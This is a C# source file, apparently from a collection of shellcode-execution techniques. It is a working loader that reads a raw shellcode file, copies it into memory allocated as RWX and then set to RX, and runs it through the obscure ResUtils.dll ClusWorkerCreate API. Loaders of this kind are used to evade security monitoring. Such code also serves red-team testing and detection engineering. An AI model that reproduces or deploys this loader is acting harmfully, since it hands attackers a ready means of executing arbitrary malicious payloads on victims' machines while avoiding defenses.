// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ClusWorkerCreate
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: ClusWorkerCreate.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            CLUS_WORKER sCW = new CLUS_WORKER();
            ClusWorkerCreate(out sCW, hAlloc, IntPtr.Zero);

            uint INFINITE = 0xffffffff;
            ClusWorkerTerminateEx(ref sCW, INFINITE, true);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess, IntPtr lpAddress,
            int dwSize, uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("ResUtils.dll")]
        static extern IntPtr ClusWorkerCreate(out CLUS_WORKER lpWorker,
            IntPtr lpStartAddress, IntPtr lpParameter);

        [DllImport("ResUtils.dll")]
        static extern IntPtr ClusWorkerTerminateEx(ref CLUS_WORKER ClusWorker,
            uint TimeoutInMilliseconds, bool WaitOnly);

        struct CLUS_WORKER
        {
            public IntPtr hThread;
            public bool Terminate;
        }
    }
}